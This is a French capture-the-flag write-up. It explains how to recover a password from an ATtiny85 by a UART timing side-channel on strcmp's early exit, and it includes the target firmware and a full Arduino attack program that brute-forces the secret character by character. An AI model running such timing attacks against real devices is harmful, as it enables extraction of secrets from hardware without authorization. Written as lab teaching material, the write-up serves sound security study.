# No Time To Flag - Writeup

## Challenge

### Énoncé

> Place aux choses sérieuses. Pourrez-vous retrouver le flag (sans dump le firmware) ?
>   Ressources :
>   - [Timing attack, Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)
>   - [ATmega328P Datasheet page 149 (USART code example), Atmel](https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf#page=149)
>
>   Notes : 
>   - Sélectionnez `ch2` sur le PCB.
>   - Format du flag : `CYBN{example_lowercase_no_accent}`
>
>   Bon courage.

### Ressources disponibles

- Plateforme physique du challenge : PCB custom avec un ATtiny85, et des pins labellisés RX/TX
- Arduino Nano pour résoudre le challenge avec câble pour flash et des câbles Dupont mâles - femelles
- Code source
```c
#define F_CPU 1000000UL
#define __AVR_ATtiny85__

#include <avr/io.h>
#include <string.h>
#include "serial.h"

// #define FLAG example_lowercase_no_accent
#include "secret.h"

char input[32];

int main(void)
{
    serial_init();
    
    DDRB &= ~(1 << PB4);
    uint8_t level = (PINB & (1 << PB4));

    for (;;)
    {
        print("mdp ?");

        recieve(input, 32);

        if (strcmp(input, FLAG) == 0)
        {
            print("Bien joué, tu peux valider avec CYBN{" FLAG "}");
        }
        else
        {
            print("Raté !");
        }
    }

    return 0;
}
```

## Solution

D'après l'énoncé, on se rend compte qu'on va devoir extraire le flag de l'ATtiny85 grâce à une attaque par canal auxilliaire.

La fonction à exploiter est `strcmp` dans `../src/main.c` : elle retourne au 1er caractère différent. 
Son implémentation est disponible ici : `https://github.com/avrdudes/avr-libc/blob/main/libc/string/_strcmp.S`
En lisant l'assembleur, on peut confirmer la faisabilité de l'attaque. Cela nous permet donc de deviner le flag
caractère par caractère, en mesurant le temps que prend l'ATtiny85 avant de nous donner une réponse, ce qui
rend le bruteforce possible. 

Il faut donc utiliser l'Arduino pour envoyer la partie du flag devinée avec le caractère à bruteforce et mesurer 
le temps que mets l'ATtony85 à répondre. Les timings sont serrés : l'ATtiny85 tourne à 1MHz, l'Arduino Nano (puce
ATmega328P) à 16MHz. Afin d'être plus précisPour mesurer le delta temporel, `micros()` n'est pas assez précis. À
la place, on incrémente dans une boucle une variable, et cette base sert pour les comparaisons. Pour gagner en
précision, on prend N mesures pour un caractère c et on compare leurs moyennes, le caractère avec la plus grande
valeur de temps est le bon.

Pour recevoir le flag, comme l'UART physique de l'Arduino est occupé (les broches RX/TX sont "reliées" à l'USB et
à l'Arduino), il faut être un peu créatif. Deux méthodes : soit l'Arduino Nano enregistre dans l'EEPROM le
résultat, soit on branche le câble USB et on "écoute" sur la ligne série sans rien envoyer. Cette dernière méthode
est utilisée dans ce writeup.

Une IA peut aider à faire une petite lib de base pour setup l'UART physique sur l'Arduino, et on adapte ensuite
le PoC :

```c
#define F_CPU 16000000UL
#define __AVR_ATmega328P__

#include <avr/io.h>
#include <util/delay.h>
#include <avr/interrupt.h>

// Définir le baud rate
#define BAUD 9600
#define UBRR_VALUE ((F_CPU / (16UL * BAUD)) - 1)

#define SAMPLE_COUNT 3

char password[33] = {0};
uint8_t password_len = 32;

char letters[] = "abcdefghijklmnopqrstuvwxyz_";
uint8_t letters_len = 27;

char nl = '\r';

void uart_init(void)
{
    // Configurer le baud rate
    UBRR0H = (unsigned char)(UBRR_VALUE >> 8);
    UBRR0L = (unsigned char)UBRR_VALUE;

    // Activer TX (transmission)
    UCSR0B = (1 << TXEN0);

    // Activer RX (réception)
    UCSR0B |= (1 << RXEN0);

    // Format : 8 bits de données, 1 bit d'arrêt, pas de parité
    UCSR0C = (1 << UCSZ01) | (1 << UCSZ00);
}

void uart_write(char data)
{
    // Attendre que le registre de transmission soit vide
    while (!(UCSR0A & (1 << UDRE0)))
        ;
    // Écrire la donnée
    UDR0 = data;
}

void uart_print(const char *str)
{
    while (*str)
    {
        uart_write(*str++);
    }
}

char uart_read(void)
{
    // Attendre que le registre de réception soit vide
    while (!(UCSR0A & (1 << RXC0)))
        ;
    // Récuperer la donnée
    return UDR0;
}

int main(void)
{
    // Désactiver les interrupts (timing précis)
    cli();

    uart_init();

    // Reset le buffer de l'ATtiny85
    uart_write(nl);

    _delay_ms(500);

    // À l'attaque !
    for (uint8_t i = 0; i < password_len; i++)
    {
        unsigned long count, best_count = 0;
        char best_count_char = 0;

        for (uint8_t j = 0; j < letters_len; j++)
        {
            unsigned long mean = 0;
            // Collecte des samples, calcul de la moyenne
            for (uint8_t l = 0; l < SAMPLE_COUNT; l++)
            {
                // Flush RX
                unsigned long timeout = 0;
                while (uart_read() != '?');

                _delay_ms(1);

                uart_print(password);
                uart_write(letters[j]);

                count = 0;

                uart_write(nl);

                // Tant que on n'a pas reçu le 1er byte de la réponse, on compte en boucle (millis() fait maison)
                while (!(UCSR0A & (1 << RXC0)))
                {
                    count++;
                }

                mean += count;

                while (UDR0 != '!');

                // On laisse l'ATtiny85 respirer
                _delay_ms(1);
            }

            mean = mean / SAMPLE_COUNT;

            if (mean > best_count)
            {
                best_count_char = letters[j];
                best_count = mean;
            }
        }

        password[i] = best_count_char;
    }

    for (;;)
        ;

    return 0;
}
```
